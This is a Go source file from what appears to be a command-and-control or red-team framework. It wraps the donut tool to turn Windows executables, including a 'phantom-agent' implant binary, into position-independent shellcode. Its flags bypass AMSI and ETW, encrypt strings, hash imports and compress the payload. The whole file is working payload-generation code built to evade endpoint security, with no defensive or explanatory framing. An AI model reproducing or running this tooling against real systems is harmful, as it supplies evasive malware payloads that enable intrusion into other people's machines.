package payloads

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
)

// ShellcodeResult holds the result of shellcode generation.
type ShellcodeResult struct {
	Path   string
	Size   int64
	Format string // "bin", "c", "hex"
}

// GenerateShellcode converts a PE binary to position-independent shellcode
// using the donut tool. Donut must be installed and in PATH.
//
// inputPE: path to the .exe or .dll to convert
// outputDir: directory to write the .bin shellcode file
// arch: "x64" or "x86"
func GenerateShellcode(inputPE, outputDir, arch string) (*ShellcodeResult, error) {
	if _, err := exec.LookPath("donut"); err != nil {
		return nil, fmt.Errorf("donut not found in PATH — install with: go install github.com/wabzsy/gonut/cmd/donut@latest")
	}

	base := filepath.Base(inputPE)
	ext := filepath.Ext(base)
	outName := base[:len(base)-len(ext)] + ".bin"
	outPath := filepath.Join(outputDir, outName)

	archFlag := "2" // 2 = x64
	if arch == "x86" {
		archFlag = "1"
	}

	cmd := exec.Command("donut",
		"-i", inputPE,
		"-o", outPath,
		"-a", archFlag, // architecture
		"-b", "1",      // bypass AMSI/ETW
		"-e", "3",      // entropy: import hashing + string encryption
		"-z", "2",      // compress with aPLib
	)

	if out, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("donut failed: %w\n%s", err, string(out))
	}

	info, err := os.Stat(outPath)
	if err != nil {
		return nil, fmt.Errorf("shellcode output not found: %w", err)
	}

	return &ShellcodeResult{
		Path:   outPath,
		Size:   info.Size(),
		Format: "bin",
	}, nil
}

// GenerateShellcodeFromAgent is a convenience wrapper that converts the
// pre-built Windows agent binary to shellcode.
func GenerateShellcodeFromAgent(buildDir string) (*ShellcodeResult, error) {
	agentPath := filepath.Join(buildDir, "agents", "phantom-agent_windows_amd64.exe")
	if _, err := os.Stat(agentPath); err != nil {
		return nil, fmt.Errorf("Windows agent not found at %s — run 'make agent-windows' first", agentPath)
	}
	return GenerateShellcode(agentPath, filepath.Join(buildDir, "agents"), "x64")
}
